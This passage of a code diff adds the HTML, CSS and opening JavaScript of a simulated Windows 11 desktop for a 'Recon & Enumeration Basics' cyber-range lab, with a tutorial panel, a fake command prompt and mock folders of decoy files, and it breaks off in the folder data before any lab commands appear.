@@ -1,0 +1,1120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Cyber Range — Recon Basics (Windows Simulator)</title>
+<style>
+  :root{
+    --accent:#57b3ff;
+    --accent-dim:#3a86c8;
+    --taskbar-bg: rgba(23,26,33,0.72);
+    --menu-bg: rgba(28,31,38,0.94);
+    --panel-bg: rgba(255,255,255,0.97);
+    --panel-ink:#1b1f27;
+    --panel-sub:#5b6270;
+    --term-bg:#0c0c0c;
+    --term-fg:#e8e8e8;
+    --radius:10px;
+    font-family:'Segoe UI Variable','Segoe UI',system-ui,-apple-system,Arial,sans-serif;
+  }
+  *{box-sizing:border-box;}
+  html,body{margin:0;padding:0;width:100%;height:100%;overflow:hidden;user-select:none;-webkit-user-select:none;}
+
+  /* ---------- DESKTOP ---------- */
+  #desktop{position:relative;width:100vw;height:100vh;overflow:hidden;}
+  #wallpaper{
+    position:absolute;inset:0;
+    background:url('wallpaper.png') center center / cover no-repeat;
+  }
+  #vignette{position:absolute;inset:0;background:linear-gradient(180deg, rgba(0,0,0,0) 60%, rgba(0,0,0,0.28) 100%);}
+
+  /* ---------- DESKTOP ICONS ---------- */
+  #desktop-icons{
+    position:absolute;top:18px;left:16px;bottom:70px;
+    display:flex;flex-direction:column;flex-wrap:wrap;align-content:flex-start;
+    gap:2px;column-gap:6px;z-index:2;
+  }
+  .d-icon{width:84px;height:82px;display:flex;flex-direction:column;align-items:center;gap:4px;padding:8px 4px;border-radius:6px;cursor:default;}
+  .d-icon:hover{background:rgba(255,255,255,0.10);}
+  .d-icon.selected{background:rgba(255,255,255,0.20);outline:1px solid rgba(255,255,255,0.45);}
+  .d-icon svg{width:38px;height:38px;filter:drop-shadow(0 1px 2px rgba(0,0,0,0.5));}
+  .d-icon span{color:#fff;font-size:12px;text-align:center;text-shadow:0 1px 3px rgba(0,0,0,0.85);line-height:1.2;}
+
+  /* ---------- START OVERLAY ---------- */
+  #start-overlay{
+    position:fixed;inset:0;z-index:999;display:flex;align-items:center;justify-content:center;
+    background:url('wallpaper.png') center center / cover no-repeat;
+  }
+  #start-overlay::before{content:'';position:absolute;inset:0;background:rgba(10,14,20,0.55);backdrop-filter:blur(2px);}
+  #overlay-card{
+    position:relative;z-index:1;text-align:center;color:#fff;max-width:480px;padding:0 24px;
+  }
+  #overlay-card .win-logo{width:52px;height:52px;margin:0 auto 22px;display:block;}
+  #overlay-card h1{font-size:26px;margin:0 0 10px;font-weight:600;letter-spacing:.2px;}
+  #overlay-card p{font-size:14.5px;color:#d7dce3;line-height:1.6;margin:0 0 30px;}
+  #ready-btn{
+    padding:13px 34px;font-size:15px;font-weight:600;color:#0c1116;background:#fff;border:none;
+    border-radius:6px;cursor:pointer;letter-spacing:.2px;transition:transform .12s ease, background .12s ease;
+  }
+  #ready-btn:hover{background:#e8e8e8;}
+  #ready-btn:active{transform:scale(0.97);}
+  #overlay-hint{margin-top:16px;font-size:11.5px;color:#9aa3ad;}
+
+  /* ---------- TASKBAR ---------- */
+  #taskbar{
+    position:absolute;left:0;right:0;bottom:0;height:48px;
+    background:var(--taskbar-bg);backdrop-filter:blur(24px) saturate(1.4);-webkit-backdrop-filter:blur(24px) saturate(1.4);
+    display:flex;align-items:center;justify-content:center;z-index:60;
+    border-top:1px solid rgba(255,255,255,0.06);
+  }
+  #taskbar-center{display:flex;align-items:center;gap:2px;}
+  .tb-btn{width:42px;height:38px;border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;position:relative;}
+  .tb-btn:hover{background:rgba(255,255,255,0.09);}
+  .tb-btn.active{background:rgba(255,255,255,0.14);}
+  .tb-btn svg{width:22px;height:22px;}
+  .tb-indicator{position:absolute;bottom:2px;left:50%;transform:translateX(-50%);width:5px;height:3px;border-radius:2px;background:var(--accent);display:none;}
+  .tb-btn.running .tb-indicator{display:block;}
+  #tray{position:absolute;right:10px;top:0;bottom:0;display:flex;align-items:center;gap:10px;color:#e8e8e8;font-size:12.5px;padding-right:6px;}
+  #tray .tray-icons{display:flex;gap:8px;opacity:0.9;}
+  #clock{text-align:right;line-height:1.15;cursor:default;padding:4px 8px;border-radius:6px;}
+  #clock:hover{background:rgba(255,255,255,0.08);}
+
+  /* ---------- START MENU ---------- */
+  #start-menu{
+    position:absolute;left:50%;bottom:58px;transform:translateX(-50%) translateY(12px);
+    width:640px;max-width:92vw;height:520px;max-height:74vh;
+    background:var(--menu-bg);backdrop-filter:blur(30px) saturate(1.3);-webkit-backdrop-filter:blur(30px) saturate(1.3);
+    border-radius:12px;box-shadow:0 20px 60px rgba(0,0,0,0.55);border:1px solid rgba(255,255,255,0.08);
+    z-index:70;opacity:0;pointer-events:none;transition:opacity .16s ease, transform .16s ease;
+    display:flex;flex-direction:column;padding:26px 30px;
+  }
+  #start-menu.open{opacity:1;pointer-events:auto;transform:translateX(-50%) translateY(0);}
+  #start-search{
+    width:100%;padding:10px 14px;border-radius:8px;border:1px solid rgba(255,255,255,0.12);
+    background:rgba(255,255,255,0.07);color:#f2f2f2;font-size:14px;outline:none;
+  }
+  #start-search::placeholder{color:#9aa0aa;}
+  #start-search:focus{border-color:var(--accent);background:rgba(255,255,255,0.1);}
+  .sm-label{color:#c7cbd1;font-size:12.5px;margin:20px 0 10px;font-weight:600;}
+  #pinned-grid{display:grid;grid-template-columns:repeat(6,1fr);gap:6px;overflow:auto;}
+  #search-results{display:none;flex-direction:column;gap:2px;overflow:auto;margin-top:4px;}
+  .app-tile{display:flex;flex-direction:column;align-items:center;gap:8px;padding:12px 4px;border-radius:8px;cursor:pointer;}
+  .app-tile:hover{background:rgba(255,255,255,0.08);}
+  .app-tile svg{width:30px;height:30px;}
+  .app-tile span{color:#e9ebee;font-size:11.5px;text-align:center;}
+  .result-row{display:flex;align-items:center;gap:12px;padding:9px 10px;border-radius:8px;cursor:pointer;}
+  .result-row:hover, .result-row.tutorial-target{background:rgba(255,255,255,0.09);}
+  .result-row svg{width:26px;height:26px;flex:none;}
+  .result-row .r-main{color:#f0f1f3;font-size:14px;}
+  .result-row .r-sub{color:#9aa0aa;font-size:11.5px;}
+  .best-match-tag{font-size:10.5px;color:#9aa0aa;text-transform:uppercase;letter-spacing:.04em;margin:2px 0 6px 2px;}
+
+  /* ---------- CMD WINDOW ---------- */
+  #cmd-window{
+    position:absolute;top:110px;left:50%;margin-left:-370px;width:740px;height:440px;
+    background:var(--term-bg);border-radius:8px;overflow:hidden;box-shadow:0 25px 70px rgba(0,0,0,0.6);
+    z-index:55;display:none;flex-direction:column;border:1px solid rgba(255,255,255,0.08);
+  }
+  #cmd-window.show{display:flex;}
+  #cmd-titlebar{height:32px;background:#1b1b1b;display:flex;align-items:center;padding:0 0 0 10px;cursor:grab;flex:none;}
+  #cmd-titlebar svg{width:15px;height:15px;margin-right:8px;}
+  #cmd-titlebar span{color:#ddd;font-size:12.5px;flex:1;}
+  .win-ctrl{width:44px;height:32px;display:flex;align-items:center;justify-content:center;cursor:pointer;color:#ccc;font-size:13px;}
+  .win-ctrl:hover{background:rgba(255,255,255,0.12);}
+  .win-ctrl.close:hover{background:#e81123;color:#fff;}
+  #cmd-body{flex:1;padding:10px 12px;overflow-y:auto;font-family:Consolas,'Cascadia Mono',monospace;font-size:13.5px;color:var(--term-fg);line-height:1.5;}
+  #cmd-body .line{white-space:pre-wrap;word-break:break-word;}
+  #cmd-body .line.cmd-echo{color:#fff;}
+  #cmd-body .line.out{color:#c7c7c7;}
+  #cmd-body .line.err{color:#ff8a8a;}
+  .prompt-row{display:flex;flex-wrap:wrap;}
+  .prompt-row .prompt-label{color:#fff;white-space:pre;}
+  #cmd-input{
+    background:transparent;border:none;outline:none;color:#fff;font-family:inherit;font-size:inherit;
+    flex:1;min-width:60px;caret-color:#fff;
+  }
+
+  /* ---------- EXPLORER WINDOW ---------- */
+  #explorer-window{
+    position:absolute;top:90px;left:50%;margin-left:-360px;width:720px;height:430px;
+    background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 25px 70px rgba(0,0,0,0.6);
+    z-index:56;display:none;flex-direction:column;border:1px solid rgba(0,0,0,0.08);
+  }
+  #explorer-window.show{display:flex;}
+  #explorer-titlebar{height:32px;background:#f3f3f3;display:flex;align-items:center;padding:0 0 0 10px;cursor:grab;flex:none;border-bottom:1px solid #e3e3e3;}
+  #explorer-titlebar svg{width:16px;height:16px;margin-right:8px;flex:none;}
+  #explorer-titlebar span{color:#1b1f27;font-size:12.5px;flex:1;}
+  #explorer-titlebar .win-ctrl{color:#333;}
+  #explorer-titlebar .win-ctrl:hover{background:rgba(0,0,0,0.06);}
+  #explorer-titlebar .win-ctrl.close:hover{background:#e81123;color:#fff;}
+  #explorer-toolbar{height:32px;background:#fafafa;border-bottom:1px solid #eee;display:flex;align-items:center;padding:0 14px;font-size:12px;color:#555;flex:none;}
+  #explorer-content{flex:1;overflow-y:auto;padding:0;}
+  .ex-header-row{display:grid;grid-template-columns:1fr 150px 160px 90px;padding:8px 16px;font-size:11.5px;color:#666;border-bottom:1px solid #eee;position:sticky;top:0;background:#fff;z-index:1;}
+  .ex-file-row{display:grid;grid-template-columns:1fr 150px 160px 90px;align-items:center;padding:7px 16px;font-size:12.5px;color:#1b1f27;cursor:default;}
+  .ex-file-row:hover{background:#f5f9ff;}
+  .ex-file-row.selected{background:#e5f1fc;}
+  .ex-file-row .fname{display:flex;align-items:center;gap:9px;overflow:hidden;}
+  .ex-file-row .fname svg{width:19px;height:24px;flex:none;}
+  .ex-file-row .fname .fn-text{white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+  .ex-file-row .fdate,.ex-file-row .fsize{color:#5b6270;font-size:12px;}
+
+  #toast{
+    position:fixed;bottom:64px;left:50%;transform:translateX(-50%) translateY(10px);
+    background:rgba(30,32,38,0.94);color:#fff;padding:9px 16px;border-radius:8px;font-size:12.5px;
+    box-shadow:0 10px 30px rgba(0,0,0,0.4);z-index:400;opacity:0;pointer-events:none;transition:opacity .2s ease, transform .2s ease;
+  }
+  #toast.show{opacity:1;transform:translateX(-50%) translateY(0);}
+
+  /* ---------- HIGHLIGHT ---------- */
+  .tutorial-target{
+    outline:3px solid #ffd43b !important;
+    outline-offset:2px;
+    box-shadow:0 0 0 6px rgba(255,212,59,0.28);
+    animation:pulseGlow 1.4s ease-in-out infinite;
+    border-radius:8px;
+  }
+  @keyframes pulseGlow{
+    0%,100%{box-shadow:0 0 0 4px rgba(255,212,59,0.28);}
+    50%{box-shadow:0 0 0 10px rgba(255,212,59,0.10);}
+  }
+  .folder-compromised{
+    outline:3px solid #ff5c5c !important;
+    outline-offset:2px;
+    box-shadow:0 0 0 6px rgba(255,92,92,0.28);
+    animation:pulseGlowRed 1.6s ease-in-out infinite;
+    border-radius:8px;
+  }
+  @keyframes pulseGlowRed{
+    0%,100%{box-shadow:0 0 0 4px rgba(255,92,92,0.28);}
+    50%{box-shadow:0 0 0 10px rgba(255,92,92,0.08);}
+  }
+
+  /* ---------- TUTORIAL PANEL ---------- */
+  #tutorial-panel{
+    position:absolute;top:0;right:0;bottom:48px;width:360px;
+    background:rgba(255,255,255,0.55);backdrop-filter:blur(18px) saturate(1.3);-webkit-backdrop-filter:blur(18px) saturate(1.3);
+    color:var(--panel-ink);border-radius:0 0 0 14px;
+    box-shadow:0 20px 50px rgba(0,0,0,0.25);z-index:120;display:flex;flex-direction:column;overflow:hidden;
+    border-left:1px solid rgba(255,255,255,0.4);border-bottom:1px solid rgba(255,255,255,0.4);
+  }
+  #tp-head{padding:16px 18px 10px;border-bottom:1px solid rgba(0,0,0,0.08);flex:none;}
+  #tp-head h1{font-size:15px;margin:0 0 2px;font-weight:700;}
+  #tp-head p{font-size:11.5px;color:var(--panel-sub);margin:0;}
+  #tp-progress-wrap{height:5px;background:#eceef1;border-radius:4px;margin-top:12px;overflow:hidden;}
+  #tp-progress-bar{height:100%;background:linear-gradient(90deg,#3a86c8,#57b3ff);width:0%;transition:width .3s ease;}
+  #tp-step-count{font-size:11px;color:var(--panel-sub);margin-top:6px;}
+  #tp-body{padding:16px 18px 18px;overflow-y:auto;flex:1;}
+  #tp-instruction{font-size:14.5px;line-height:1.5;margin:0 0 12px;}
+  #tp-instruction b{color:#0f5ea8;}
+  .cmd-chip{
+    display:inline-block;font-family:Consolas,monospace;font-size:13px;background:#101317;color:#7ee787;
+    padding:8px 10px;border-radius:6px;margin:2px 0 10px;width:100%;box-sizing:border-box;
+  }
+  .cmd-whatitdoes{
+    font-size:13px;line-height:1.5;color:#2b2f38;background:rgba(255,255,255,0.5);
+    border-left:3px solid #0f6cbd;padding:8px 10px;border-radius:0 6px 6px 0;margin:0 0 4px;
+  }
+  .cmd-whatitdoes b{color:#0f5ea8;}
+  #tp-feedback{
+    display:none;background:#f0f8ef;border:1px solid #cfe8cb;border-radius:8px;padding:12px 13px;font-size:13px;
+    line-height:1.5;color:#20401d;margin-top:6px;
+  }
+  #tp-feedback.warn{background:#fdf2ee;border-color:#f2cdc0;color:#5a2c1a;}
+  #tp-feedback b{display:block;margin-bottom:4px;font-size:13px;}
+  #tp-continue{
+    margin-top:14px;width:100%;padding:9px 0;border:none;border-radius:7px;background:#0f6cbd;color:#fff;
+    font-size:13.5px;cursor:pointer;display:none;font-weight:600;
+  }
+  #tp-continue:hover{background:#0b5aa1;}
+  #tp-done-badge{display:none;color:#0f6cbd;font-size:12.5px;font-weight:600;margin-top:10px;}
+  #tp-restart{
+    margin-top:10px;width:100%;padding:9px 0;border:1px solid #d8dbe0;border-radius:7px;background:#fff;color:#1b1f27;
+    font-size:13px;cursor:pointer;display:none;
+  }
+  #tp-disclaimer{font-size:10.5px;color:#9aa0aa;padding:10px 18px 14px;border-top:1px solid #ececec;flex:none;}
+</style>
+</head>
+<body>
+
+<div id="desktop">
+  <div id="wallpaper"></div>
+  <div id="vignette"></div>
+
+  <div id="desktop-icons">
+    <div class="d-icon" title="This PC">
+      <svg viewBox="0 0 48 48"><rect x="4" y="8" width="40" height="26" rx="2" fill="#dfe6ee"/><rect x="7" y="11" width="34" height="18" fill="#4a90d9"/><rect x="18" y="36" width="12" height="4" fill="#b7c0cb"/><rect x="14" y="40" width="20" height="2.5" rx="1.2" fill="#b7c0cb"/></svg>
+      <span>This PC</span>
+    </div>
+    <div class="d-icon" title="Recycle Bin">
+      <svg viewBox="0 0 48 48"><path d="M14 14h20l-2 26a3 3 0 0 1-3 3H19a3 3 0 0 1-3-3z" fill="#e7ecf1"/><path d="M14 14h20l-1 6H15z" fill="#c3cdd8"/><rect x="18" y="8" width="12" height="4" rx="1" fill="#c3cdd8"/><rect x="10" y="12" width="28" height="3" rx="1.2" fill="#9aa6b2"/></svg>
+      <span>Recycle Bin</span>
+    </div>
+    <div class="d-icon" title="My Files — double-click to open" data-folder="myfiles">
+      <svg viewBox="0 0 48 48"><path d="M4 12a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v3H4z" fill="#ffca61"/><path d="M4 15h40v18a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3z" fill="#ffb734"/></svg>
+      <span>My Files</span>
+    </div>
+    <div class="d-icon" title="Documents — double-click to open" data-folder="documents">
+      <svg viewBox="0 0 48 48"><path d="M4 12a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v3H4z" fill="#8fc4ff"/><path d="M4 15h40v18a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3z" fill="#5fa8f5"/></svg>
+      <span>Documents</span>
+    </div>
+    <div class="d-icon" title="Pictures — double-click to open" data-folder="pictures">
+      <svg viewBox="0 0 48 48"><path d="M4 12a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v3H4z" fill="#ffca61"/><path d="M4 15h40v18a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3z" fill="#ffb734"/><circle cx="15" cy="26" r="2.6" fill="#fff8ea"/><path d="M9 37l8-8 6 5 5-5 9 8z" fill="#fff8ea" opacity="0.9"/></svg>
+      <span>Pictures</span>
+    </div>
+    <div class="d-icon" title="Downloads — double-click to open" data-folder="downloads">
+      <svg viewBox="0 0 48 48"><path d="M4 12a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v3H4z" fill="#8fc4ff"/><path d="M4 15h40v18a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3z" fill="#5fa8f5"/><path d="M24 21v11m0 0l-4.5-4.5M24 32l4.5-4.5" stroke="#eaf4ff" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      <span>Downloads</span>
+    </div>
+    <div class="d-icon" title="Business Plan — double-click to open" data-folder="businessplan">
+      <svg viewBox="0 0 48 48"><path d="M4 12a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v3H4z" fill="#ffca61"/><path d="M4 15h40v18a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3z" fill="#ffb734"/><rect x="14" y="23" width="20" height="14" rx="1.5" fill="#fff8ea"/><path d="M17 34v-5m6 5v-8m6 8v-3" stroke="#c98a1f" stroke-width="2" stroke-linecap="round"/></svg>
+      <span>Business Plan</span>
+    </div>
+  </div>
+
+  <!-- FULLSCREEN START OVERLAY -->
+  <div id="start-overlay">
+    <div id="overlay-card">
+      <svg class="win-logo" viewBox="0 0 24 24"><rect x="2" y="2" width="9" height="9" fill="#57b3ff"/><rect x="13" y="2" width="9" height="9" fill="#57b3ff"/><rect x="2" y="13" width="9" height="9" fill="#57b3ff"/><rect x="13" y="13" width="9" height="9" fill="#57b3ff"/></svg>
+      <h1>Cyber Range · Recon &amp; Enumeration Basics</h1>
+      <p>A guided, simulated Windows 11 desktop. Follow the on-screen instructions to practice built-in reconnaissance commands. No real system or network is affected.</p>
+      <button id="ready-btn">Ready to Start</button>
+      <div id="overlay-hint">This will open in full screen. Press Esc anytime to exit full screen.</div>
+    </div>
+  </div>
+
+  <!-- START MENU -->
+  <div id="start-menu">
+    <input id="start-search" type="text" placeholder="Type here to search" autocomplete="off">
+    <div class="sm-label" id="pinned-label">Pinned</div>
+    <div id="pinned-grid"></div>
+    <div id="search-results"></div>
+  </div>
+
+  <!-- FILE EXPLORER WINDOW -->
+  <div id="explorer-window">
+    <div id="explorer-titlebar">
+      <svg viewBox="0 0 48 48"><path d="M4 12a3 3 0 0 1 3-3h11l4 4h19a3 3 0 0 1 3 3v3H4z" fill="#ffca61"/><path d="M4 15h40v18a3 3 0 0 1-3 3H7a3 3 0 0 1-3-3z" fill="#ffb734"/></svg>
+      <span id="explorer-title">Documents</span>
+      <div class="win-ctrl">&#8211;</div>
+      <div class="win-ctrl">&#9723;</div>
+      <div class="win-ctrl close" id="explorer-close">&#10005;</div>
+    </div>
+    <div id="explorer-toolbar"><span id="explorer-breadcrumb">This PC &gt; Desktop &gt; Documents</span></div>
+    <div id="explorer-content">
+      <div class="ex-header-row"><span>Name</span><span>Date modified</span><span>Type</span><span>Size</span></div>
+      <div id="explorer-list"></div>
+    </div>
+  </div>
+
+  <!-- COMMAND PROMPT WINDOW -->
+  <div id="cmd-window">
+    <div id="cmd-titlebar">
+      <svg viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#000"/><path d="M5 8l4 4-4 4" stroke="#fff" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11" y1="16" x2="18" y2="16" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/></svg>
+      <span>Command Prompt</span>
+      <div class="win-ctrl">&#8211;</div>
+      <div class="win-ctrl">&#9723;</div>
+      <div class="win-ctrl close" id="cmd-close">&#10005;</div>
+    </div>
+    <div id="cmd-body"></div>
+  </div>
+
+  <!-- TASKBAR -->
+  <div id="taskbar">
+    <div id="taskbar-center">
+      <div class="tb-btn" id="start-button" title="Start">
+        <svg viewBox="0 0 24 24"><rect x="2" y="2" width="9" height="9" fill="#57b3ff"/><rect x="13" y="2" width="9" height="9" fill="#57b3ff"/><rect x="2" y="13" width="9" height="9" fill="#57b3ff"/><rect x="13" y="13" width="9" height="9" fill="#57b3ff"/></svg>
+      </div>
+      <div class="tb-btn" title="Search">
+        <svg viewBox="0 0 24 24" fill="none"><circle cx="10.5" cy="10.5" r="6.5" stroke="#fff" stroke-width="1.6"/><line x1="15.2" y1="15.2" x2="20" y2="20" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/></svg>
+      </div>
+      <div class="tb-btn" title="Task View">
+        <svg viewBox="0 0 24 24" fill="none"><rect x="3" y="4" width="7" height="6" rx="1" stroke="#fff" stroke-width="1.5"/><rect x="14" y="4" width="7" height="6" rx="1" stroke="#fff" stroke-width="1.5"/><rect x="3" y="14" width="7" height="6" rx="1" stroke="#fff" stroke-width="1.5"/><rect x="14" y="14" width="7" height="6" rx="1" stroke="#fff" stroke-width="1.5"/></svg>
+      </div>
+      <div class="tb-btn" title="File Explorer">
+        <svg viewBox="0 0 24 24"><path d="M2 6a2 2 0 0 1 2-2h5l2 2h9a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" fill="#ffca61"/><path d="M2 9h20v9a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" fill="#ffb734"/></svg>
+      </div>
+      <div class="tb-btn" title="Microsoft Edge">
+        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#0f8fd9"/><path d="M4 13c1-6 8-9 13-6 3 2 3 6 0 7-4 2-9-1-8-4 1-2 4-2 5 0" stroke="#fff" stroke-width="1.3" fill="none" stroke-linecap="round"/></svg>
+      </div>
+      <div class="tb-btn running" id="cmd-taskbtn" title="Command Prompt" style="display:none;">
+        <svg viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#000"/><path d="M5 8l4 4-4 4" stroke="#fff" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11" y1="16" x2="18" y2="16" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/></svg>
+        <div class="tb-indicator"></div>
+      </div>
+    </div>
+    <div id="tray">
+      <div class="tray-icons">
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none"><path d="M4 10a12 12 0 0 1 16 0M7 13a8 8 0 0 1 10 0M10 16a4 4 0 0 1 4 0" stroke="#fff" stroke-width="1.4" stroke-linecap="round"/><circle cx="12" cy="19" r="1.2" fill="#fff"/></svg>
+        <svg viewBox="0 0 24 24" width="16" height="16" fill="none"><path d="M4 10v4h4l5 4V6l-5 4z" fill="#fff"/><path d="M16 9a4 4 0 0 1 0 6" stroke="#fff" stroke-width="1.4" stroke-linecap="round"/></svg>
+      </div>
+      <div id="clock"><div id="clock-time">--:--</div><div id="clock-date">--/--/----</div></div>
+    </div>
+  </div>
+
+  <div id="toast"></div>
+
+  <!-- TUTORIAL PANEL -->
+  <div id="tutorial-panel">
+    <div id="tp-head">
+      <div id="tp-progress-wrap"><div id="tp-progress-bar"></div></div>
+      <div id="tp-step-count">Step 1 of 9</div>
+    </div>
+    <div id="tp-body">
+      <div id="tp-instruction">Loading…</div>
+      <div id="tp-feedback"></div>
+      <button id="tp-continue">Continue</button>
+      <div id="tp-done-badge">✓ Nice work — module complete.</div>
+      <button id="tp-restart">Restart lab</button>
+    </div>
+    <div id="tp-disclaimer">Simulated environment — no real system, network, or account is affected. Always get written authorization before running these commands against systems you don't own.</div>
+  </div>
+</div>
+
+<script>
+(function(){
+
+/* ---------------- ICONS (reused as strings) ---------------- */
+const ICO = {
+  cmd: `<svg viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#000"/><path d="M5 8l4 4-4 4" stroke="#fff" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11" y1="16" x2="18" y2="16" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/></svg>`,
+  powershell: `<svg viewBox="0 0 24 24"><rect width="24" height="24" rx="4" fill="#1f6feb"/><path d="M5 8l4 4-4 4" stroke="#fff" stroke-width="1.6" fill="none" stroke-linecap="round" stroke-linejoin="round"/><line x1="11" y1="16" x2="18" y2="16" stroke="#fff" stroke-width="1.6" stroke-linecap="round"/></svg>`,
+  edge: `<svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10" fill="#0f8fd9"/><path d="M4 13c1-6 8-9 13-6 3 2 3 6 0 7-4 2-9-1-8-4 1-2 4-2 5 0" stroke="#fff" stroke-width="1.3" fill="none" stroke-linecap="round"/></svg>`,
+  explorer: `<svg viewBox="0 0 24 24"><path d="M2 6a2 2 0 0 1 2-2h5l2 2h9a2 2 0 0 1 2 2v9a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" fill="#ffca61"/><path d="M2 9h20v9a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2z" fill="#ffb734"/></svg>`,
+  settings: `<svg viewBox="0 0 24 24" fill="none"><circle cx="12" cy="12" r="3" stroke="#dfe3e8" stroke-width="1.5"/><path d="M12 3v2M12 19v2M4.2 4.2l1.4 1.4M18.4 18.4l1.4 1.4M3 12h2M19 12h2M4.2 19.8l1.4-1.4M18.4 5.6l1.4-1.4" stroke="#dfe3e8" stroke-width="1.5" stroke-linecap="round"/></svg>`,
+  calc: `<svg viewBox="0 0 24 24"><rect x="4" y="2" width="16" height="20" rx="2" fill="#3a3a3a"/><rect x="6.5" y="4.5" width="11" height="4.5" rx="1" fill="#7ee787"/><circle cx="8" cy="13" r="1.3" fill="#ccc"/><circle cx="12" cy="13" r="1.3" fill="#ccc"/><circle cx="16" cy="13" r="1.3" fill="#ccc"/><circle cx="8" cy="17" r="1.3" fill="#ccc"/><circle cx="12" cy="17" r="1.3" fill="#ccc"/><circle cx="16" cy="17" r="1.3" fill="#ff9f43"/></svg>`,
+  mail: `<svg viewBox="0 0 24 24"><rect x="2" y="5" width="20" height="14" rx="2" fill="#2b8ce6"/><path d="M3 6l9 7 9-7" stroke="#eaf4ff" stroke-width="1.5" fill="none"/></svg>`,
+  photos: `<svg viewBox="0 0 24 24"><rect x="3" y="4" width="18" height="16" rx="2" fill="#e9edf2"/><circle cx="8" cy="9" r="2" fill="#ffb734"/><path d="M4 18l6-6 4 4 3-3 5 5" stroke="#3a86c8" stroke-width="1.8" fill="none"/></svg>`,
+  store: `<svg viewBox="0 0 24 24"><path d="M4 8l1-4h14l1 4z" fill="#2b8ce6"/><rect x="4" y="8" width="16" height="12" fill="#e9edf2"/><path d="M4 8h16" stroke="#1f6feb" stroke-width="0.6"/></svg>`
+};
+
+/* ---------------- FILE TYPE ICONS ---------------- */
+function officeIcon(color,label){
+  return `<svg viewBox="0 0 32 40"><path d="M4 2h16l8 8v26a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z" fill="#fff" stroke="#dcdcdc"/><path d="M20 2v8h8z" fill="#eee"/><rect x="2" y="23" width="28" height="13" rx="1.5" fill="${color}"/><text x="16" y="32.5" font-size="9.5" font-family="Segoe UI,Arial" fill="#fff" text-anchor="middle" font-weight="700">${label}</text></svg>`;
+}
+function imageIcon(){
+  return `<svg viewBox="0 0 32 40"><path d="M4 2h16l8 8v26a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z" fill="#fff" stroke="#dcdcdc"/><path d="M20 2v8h8z" fill="#eee"/><rect x="6" y="14" width="20" height="17" rx="1.5" fill="#eaf3ff" stroke="#bcd8f5"/><circle cx="11" cy="19.5" r="2" fill="#ffb734"/><path d="M8 29l5-5 4 3 4-4.5 4 6.5z" fill="#5fa8f5"/></svg>`;
+}
+function exeIcon(){
+  return `<svg viewBox="0 0 32 40"><rect x="2" y="8" width="28" height="19" rx="2" fill="#3a3a3a"/><rect x="5" y="11" width="22" height="12" fill="#8fc4ff"/><rect x="13" y="27" width="6" height="3" fill="#9aa0aa"/><rect x="8" y="31" width="16" height="3" rx="1.2" fill="#9aa0aa"/></svg>`;
+}
+function txtIcon(){
+  return `<svg viewBox="0 0 32 40"><path d="M4 2h16l8 8v26a2 2 0 0 1-2 2H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2z" fill="#fff" stroke="#dcdcdc"/><path d="M20 2v8h8z" fill="#eee"/><line x1="7" y1="18" x2="25" y2="18" stroke="#c9c9c9" stroke-width="1.4"/><line x1="7" y1="23" x2="25" y2="23" stroke="#c9c9c9" stroke-width="1.4"/><line x1="7" y1="28" x2="19" y2="28" stroke="#c9c9c9" stroke-width="1.4"/></svg>`;
+}
+const FILE_ICONS = {
+  docx: officeIcon('#2b579c','W'),
+  xlsx: officeIcon('#217346','X'),
+  pptx: officeIcon('#d24726','P'),
+  pdf:  officeIcon('#c62828','PDF'),
+  img:  imageIcon(),
+  exe:  exeIcon(),
+  txt:  txtIcon()
+};
+const FILE_KIND_LABEL = {
+  docx:'Word Document', xlsx:'Excel Worksheet', pptx:'PowerPoint Presentation',
+  pdf:'PDF Document', img:'Image', exe:'Application', txt:'Text Document'
+};
+
+/* ---------------- DESKTOP FOLDER CONTENTS ----------------
+   Every filename below appears in exactly one folder — nothing is duplicated
+   across folders, matching a real, tidy (if slightly messy) user profile. */
+const FOLDERS = {
+  myfiles: { title:'My Files', files:[
+    {name:'Passwords_Backup.txt', type:'txt', size:'2 KB',   date:'3/14/2026 9:12 AM'},
+    {name:'Resume_JohnDoe.docx',  type:'docx',size:'48 KB',  date:'2/2/2026 4:47 PM'},
+    {name:'Old_Notes.txt',        type:'txt', size:'6 KB',   date:'11/30/2025 8:03 AM'}
+  ]},
+  documents: { title:'Documents', files:[
+    {name:'Employee_Handbook.docx',  type:'docx', size:'512 KB', date:'1/9/2026 10:22 AM'},
